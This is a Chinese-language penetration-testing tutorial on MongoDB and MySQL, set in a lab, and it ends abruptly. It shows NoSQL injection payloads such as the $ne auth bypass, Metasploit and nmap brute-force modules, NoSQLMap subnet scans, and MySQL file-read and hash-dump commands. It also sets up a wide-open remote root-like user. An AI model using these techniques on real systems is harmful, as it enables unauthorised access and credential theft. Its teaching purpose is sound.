### MongoDB HTTP接口及安全性评估

#### 1. MongoDB HTTP接口概述
MongoDB提供了一个简单的HTTP界面，用于列出管理员感兴趣的信息。如果在启动`mongod`时启用了`--rest`选项，则可以通过比配置的`mongod`端口高1000的端口访问该HTTP接口。例如，默认情况下，`mongod`端口为27017，那么HTTP接口的默认端口为28017。

**注意**：从版本2.6开始，默认情况下禁用HTTP接口。

#### 2. 访问和扫描HTTP接口
- **2.5 访问HTTP接口**
  可以直接通过HTTP链接访问：
  ```
  http://<hostname>:28017
  ```

- **2.6 使用nmap NSE脚本进行扫描**
  如果HTTP接口需要认证，可以使用nmap的NSE脚本进行暴力破解。有许多nmap NSE脚本可用于MongoDB漏洞评估，例如`mongodb-brute`和`mongodb-databases`。

- **2.7 mongodb-brute**
  使用这个NSE脚本对MongoDB数据库执行暴力破解密码审计。如果确认不需要认证，可以跳过此步骤。

- **2.8 mongodb-databases**
  使用这个NSE脚本尝试从MongoDB数据库获取表的列表。这只有在MongoDB接口不需要验证的情况下才有效。

- **2.9 Metasploit辅助模块**
  使用`auxiliary/scanner/mongodb/mongodb_login`辅助模块进行登录测试。
  ```bash
  use auxiliary/scanner/mongodb/mongodb_login
  show options
  set RHOSTS <target_ip>
  set USERNAME <username>
  set PASSWORD <password>
  run
  ```

  从MongoDB版本3.0开始，MongoDB已经将其默认的认证方法改变为质询和响应机制（SCRAM-SHA-1）。用户必须提供用户名、密码和创建用户的数据库名称才能成功认证。
  ```bash
  mongo 192.168.2.105 -u user -p password --authenticationDatabase userdb
  ```

  在MongoDB上进行暴力破解较为困难，因为需要正确提供用户名、密码和数据库名称。自动化工具通常默认选择“admin”作为数据库。

- **2.10 攻击利用**
  在信息收集阶段，如果发现远程主机运行MongoDB且不需要身份验证即可连接到服务器，可以进行以下操作：
  - 直接连接到MongoDB数据库。
  - 通过HTTP访问28017端口进行操作。

  当`mongod`通过网络暴露给其他主机时，必须小心防止不必要的公网暴露。

### 3. NoSQL注入攻击

#### 3.1 介绍
在使用MongoDB作为后端的应用程序中，NoSQL注入攻击是可能的。即使MongoDB不使用SQL，当用户输入没有正确过滤时，仍然可以进行注入攻击。

#### 3.2 示例：PHP-MongoDB应用程序
- **认证绕过**
  确保浏览器配置为通过Burp代理发送所有流量。截取POST请求并修改参数以绕过认证。
  ```javascript
  db.users.find({ username: "tom", password: { $ne: "test0x00" } });
  ```

  这将返回所有用户名为“tom”但密码不等于“test0x00”的文档。

- **测试注入**
  传递未知的操作符以测试MongoDB的存在和异常处理。
  ```javascript
  db.users.find({ username: "tom", password: { $nt: "test0x00" } });
  ```

  如果异常处理不当，会显示错误信息，从而确认MongoDB的存在。

- **枚举数据**
  在搜索用户购买详情时，可以通过注入操作符来提取数据。
  ```javascript
  http://192.168.2.105/home.php?search=PI:EMAIL&Search=Search
  ```

  修改URL中的操作符以遍历数据。
  ```javascript
  http://192.168.2.105/home.php?search[$ne]=OybrUiUGatApIIdOioUS&Search=Search
  ```

  解决方案是确保用户输入在处理之前被严格验证。

### 4. 自动化评估

#### 4.1 NoSQLMap
NoSQLMap是一个开源的Python工具，用于审计和自动化注入攻击，并利用NoSQL数据库中的缺省配置弱点。

- **特性**
  - 自动化的MongoDB和CouchDB数据库枚举和克隆攻击。
  - 提取数据库名称、用户和密码哈希。
  - 扫描子网或IP列表以查找默认访问和枚举版本。
  - 强力字典爆破哈希。
  - 针对MongoClient的PHP应用程序参数注入攻击。
  - 基于计时的攻击类似于SQL盲注。

- **设置参数**
  ```bash
  nosqlmap.py
  1. 设置目标IP地址
  2. 设置WEB应用地址
  3. 设置可能存在注入的路径
  4. 切换HTTPS
  5. 设置MongoDB的工作端口
  6. 设置HTTP请求模式
  7. 设置本地IP地址
  8. 设置本地监听端口
  ```

- **NoSQL DB访问攻击**
  检查目标服务器上的MongoDB是否可通过网络访问，并检测错误配置。

- **匿名MongoDB访问扫描**
  扫描整个子网上的MongoDB访问。
  ```bash
  nosqlmap.py -t 192.168.152.0/24
  ```

- **NoSQL注入**
  测试Web应用程序中的注入漏洞。
  ```bash
  nosqlmap.py -u http://192.168.152.151:80/home.php
  ```

### 结论
系统的安全性与其最薄弱的环节一样强大。小小的错误配置会导致严重的损坏。请保持你的MongoDB是最新的，并且在传递给MongoDB之前总是验证用户的输入。

### MySQL命令参考

| 命令 | 描述 |
| --- | --- |
| `select @@version` | 显示MySQL服务器版本 |
| `select version()` | 显示MySQL服务器版本 |
| `SHOW STATUS` | 显示MySQL服务器状态信息 |
| `show VARIABLES` | 显示所有的MySQL服务器变量 |
| `select user()` | 查询当前数据库用户 |
| `SHOW VARIABLES LIKE '%datadir%'` | 显示包含数据字符串的所有变量 |
| `select load_file('/etc/passwd');` | 加载文件到数据库中 |
| `select 0xnnnnnn... INTO OUTFILE '/path/to/filename'` | 将数据写入文本文件 |
| `select 0xnnnnnn... INTO DUMPFILE '/path/to/filename'` | 将数据写入二进制文件 |

#### 安装MySQL数据库服务器
```bash
$ sudo apt-get install mysql-server
$ sudo systemctl start mysql
```
编辑 `/etc/mysql/mysql.conf.d/mysqld.cnf`，更改绑定地址：
```ini
bind-address = 0.0.0.0
```

#### 允许远程访问
```bash
root@sh:~# ss -ant | grep ":3306"
LISTEN     0      80           *:3306                     *:*
root@sh:~# mysql -h 10.0.250.71 -uroot -p
Enter password:
ERROR 1130 (HY000): Host '10.0.250.71' is not allowed to connect to this MySQL server
```

#### 创建用户
```sql
CREATE USER 'mysqlsec'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'mysqlsec'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

#### 爆破MySQL
```bash
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):
   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE         /tmp/pass.txt    no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.0.250.71      yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port
   STOP_ON_SUCCESS   true             yes       Stop guessing when a credential works for a host
   THREADS           10               yes       The number of concurrent threads
   USERNAME          mysqlsec         no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
msf auxiliary(mysql_login) > run
```

#### 导出MySQL哈希值
```bash
msf auxiliary(mysql_hashdump) > show options
Module options (auxiliary/scanner/mysql/mysql_hashdump):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
```